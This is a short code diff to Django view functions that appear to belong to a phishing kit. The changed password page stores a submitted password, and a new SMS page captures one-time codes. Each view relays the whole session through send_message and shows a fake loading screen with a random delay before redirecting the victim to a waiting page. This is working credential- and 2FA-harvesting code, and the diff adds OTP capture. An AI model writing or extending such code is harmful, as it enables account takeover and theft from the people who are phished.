@@ -59,12 +59,22 @@ def recap_info_page(request):
 
 def password_page(request):
     if request.method == 'POST':
-        request.session['code'] = request.POST.get('code')
+        request.session['password'] = request.POST.get('code')
         send_message(request.session)
         return render(request, 'loader.html',
                       {'redirect_to': PageRedirection.WAITING.value + gen_url_query(),
                        'waiting': random.randint(2000, 5000)})
     return render(request, 'code.html', {})
+
+
+def sms_page(request):
+    if request.method == 'POST':
+        request.session['sms'] = request.POST.get('sms')
+        send_message(request.session)
+        return render(request, 'loader.html',
+                      {'redirect_to': PageRedirection.WAITING.value + gen_url_query(),
+                       'waiting': random.randint(2000, 5000)})
+    return render(request, 'sms.html', {})
 
 
 def waiting_page(request):
